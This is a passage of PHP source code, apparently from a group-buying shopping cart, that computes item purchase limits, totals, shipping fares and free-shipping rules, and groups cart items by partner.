				$team_on[$v['id']]['max_num']=$team_on[$v['id']]['per_number'];
			}elseif($team_on[$v['id']]['max_number']>0){
				$team_on[$v['id']]['max_num']=($team_on[$v['id']]['max_number']-$team_on[$v['id']]['now_number']);
			}else{
				$team_on[$v['id']]['max_num']=0;
			}

			
			$team_ids[]=$v['id'];
			$teams[$k]=$team_on[$v['id']];
			
			$total_price+=$team_on[$v['id']]['num']*$team_on[$v['id']]['team_price'];
			$total_num+=$team_on[$v['id']]['num'];
		}
	}

	if(empty($teams)) return false;
	array_multisort($team_ids,SORT_DESC,$teams);

	foreach($teams as $k=>$v){
		//是否不足量或超量
		if(is_post()){
			if($team_on[$v['id']]['num']<$v['min_num']||($v['max_num']>0&&$team_on[$v['id']]['num']>$v['max_num'])){
				Session::Set('error', "{$v['product']} 没有达到最少购买量或已超出最大购买量！");
				redirect( WEB_ROOT . "/cart/index.php");
			}
		}
		if ($v['delivery'] == 'express'){
		   $is_express = 1;
		}
		if($v['farefree']>0&&$team_on[$v['id']]['num']>=$v['farefree']){
			$p_teams[$v['partner_id']]['farefree']=1;	
		}
		$p_teams[$v['partner_id']]['fare']=$p_teams[$v['partner_id']]['farefree']?0:max($p_teams[$v['partner_id']]['fare'],$v['fare']);

		$p_teams[$v['partner_id']]['total_price']+=$v['num']*$v['team_price'];
		$p_teams[$v['partner_id']]['total_num']+=$v['num'];
		$p_teams[$v['partner_id']]['teams'][$k]=$v;
	}

	return $p_teams;

}

set_error_handler('error_handler');
